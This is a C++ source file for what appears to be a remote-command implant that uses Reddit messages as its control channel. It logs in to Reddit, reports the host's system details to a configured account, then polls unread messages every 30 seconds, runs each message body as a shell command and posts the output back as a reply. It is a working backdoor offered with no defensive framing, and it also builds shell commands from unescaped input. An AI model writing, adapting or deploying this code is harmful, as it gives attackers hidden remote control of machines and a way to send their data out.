//g++ -pthread -o "reddit" "reddit.cxx"
#include <pstreams/pstream.h>		//redi (libpstreams-dev)
#include <regex>
#include <thread>
//#include <iostream>					//cout
//#include <ctime>
//#include <chrono>
//#include <string>
using namespace std;

string shell_exec(string cmdstr)
{
	//cout << cmdstr << "\n\n";
	const char* cmd = cmdstr.c_str();
	array<char, 10240> buffer;		//128
	string results;
	unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
	while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
		results += buffer.data();
	}
	//cout << results << "\n\n";
	return results;
}

string curl(string method, string access_token, string data, string curl_api)
{
	string user_agent = "Mozilla/5.0 (X11; CrOS x86_64 12239.92.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.136 Safari/537.36";
	string curl_method = " -X " + method;
	string curl_access_token = " -H \"Authorization: bearer " + access_token + "\"";
	string curl_data = "";
	if(data.empty()){
	} else {
		curl_data = " -d \'" + data + "\'";
	}
	string curl_user_agent = " -A \'" + user_agent + "\'";
	string cmd = "curl -s" + curl_method + curl_access_token + curl_data + curl_user_agent + " https://oauth.reddit.com" + curl_api;
	string results = shell_exec(cmd);
	return results;
}

string login(string username, string password, string id, string secret)
{
	string request = "curl -s -X POST -d \'grant_type=password&username=" + username + "&password=" + password + "\' --user \'" + id + ":" + secret + "\' -A \"Mozilla/5.0 (X11; CrOS x86_64 12239.92.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.136 Safari/537.36\" https://www.reddit.com/api/v1/access_token";
	string get_access_token = shell_exec(request);
    regex access_token_regex(R"|("access_token": "([^"]*)")|");
    smatch search_match;
	regex_search(get_access_token, search_match, access_token_regex);
	string access_token =  search_match[1];
	return access_token;
}

int compose(string access_token, string to, string subject, string body)
{
	string data = "to=" + to + "&subject=" + subject + "&text=" + body;
	curl("POST", access_token, data, "/api/compose");
	return 1;
}

string get_contents(string access_token, string thing_id)
{
	string contents;
	string get_body = curl("GET", access_token, "", "/message/unread");
	regex body_regex(R"|("body": "([\s\S]+)", "dest":)|");
	regex amp("&amp;"), quote("\\\\\""), less("&lt;"), greater("&gt;"), escape("\\\\\\\\");
	smatch search_match;
	regex_search(get_body, search_match, body_regex);
	contents = search_match[1];
	if (contents.find("&amp;") != string::npos){
		contents = regex_replace (contents, amp, "&");
	} if (contents.find("\\\"") != string::npos){
		contents = regex_replace (contents, quote, "\"");
	} if (contents.find("&lt;") != string::npos){
		contents = regex_replace (contents, less, "<");
	} if (contents.find("&gt;") != string::npos){
		contents = regex_replace (contents, greater, ">");
	} if (contents.find("\\\\") != string::npos){
		contents = regex_replace (contents, escape, "\\");
	}
	return contents;
}


int reply(string access_token, string thing_id, string body)
{
	string data = "thing_id=" + thing_id + "&text=" + body;
	curl("POST", access_token, data, "/api/comment");
	return 1;
}


string check_new_message(string access_token)
{
	string message, thing_id;
	smatch search_match;
	string get_message = curl("GET", access_token, "", "/message/unread");
	regex message_regex(R"|("dist": (\d))|");
	regex_search(get_message, search_match, message_regex);
	message = search_match[1];
	if (message == "1"){
		regex thing_id_regex(R"|("name": "([^"]*)")|");
		regex_search(get_message, search_match, thing_id_regex);
		string thing_id =  search_match[1];
		return thing_id;
	}else if (message == ""){
		return "get_new_token";
	}else{
		return message;
	}
}

int main()
{
	string username = "<user>", password = "<password>", to = "<user>";
	string id = "<id>", secret = "<secret>";
	string epoch = to_string(time(nullptr));
	string access_token = login(username, password, id, secret);
	curl("POST", access_token, "", "/api/read_all_messages");
	compose(access_token, to, epoch, shell_exec("uname -a"));
	string thing_id, backup_id;
	do {
		thing_id = check_new_message(access_token);
		if (thing_id == "0"){
		}else if (thing_id.rfind("t4_", 0) == 0){
			reply(access_token, thing_id, shell_exec(get_contents(access_token, thing_id)));
			curl("POST", access_token, "", "/api/read_all_messages");
			backup_id = thing_id;
		}else if (thing_id == "get_new_token"){
				access_token = login(username, password, id, secret);
		}else{
			reply(access_token, backup_id, "error: " + thing_id + " commands received: clearing queue");
			curl("POST", access_token, "", "/api/read_all_messages");
		}
		this_thread::sleep_for(chrono::seconds(30));
		}
	while(true);
	return 0;
}
